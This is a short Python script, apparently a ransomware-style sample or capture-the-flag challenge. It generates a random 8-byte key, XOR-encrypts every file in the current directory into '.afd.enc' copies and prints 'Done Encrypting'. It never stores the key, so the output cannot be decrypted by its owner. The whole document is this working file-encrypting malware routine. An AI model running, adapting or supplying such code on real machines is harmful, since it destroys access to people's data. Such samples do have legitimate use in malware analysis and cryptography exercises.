import os

KEY = os.urandom(8)

def list_files_in_directory(directory_path):
    files = []
    try:
        for entry in os.listdir(directory_path):
            full_path = os.path.join(directory_path, entry)
            if os.path.isfile(full_path):
                files.append(full_path)
    except FileNotFoundError:
        print(f"The directory {directory_path} does not exist.")
    except Exception as e:
        print(f"An error occurred: {e}")
    
    return files

def xor(byte1, byte2):
    repeated_key = (byte2 * (len(byte1) // len(byte2) + 1))[:len(byte1)]
    return bytes([b1 ^ b2 for b1, b2 in zip(byte1, repeated_key)])

def encrypt(pt, key):
    return xor(pt, key)

if __name__ == "__main__":
    files_list = list_files_in_directory('./')

    for i in files_list:
        pt = open(i,'rb').read()

        with open(i + '.afd.enc', 'wb') as f:
            f.write(encrypt(pt,KEY))
            f.close()

    print("Done Encrypting.....")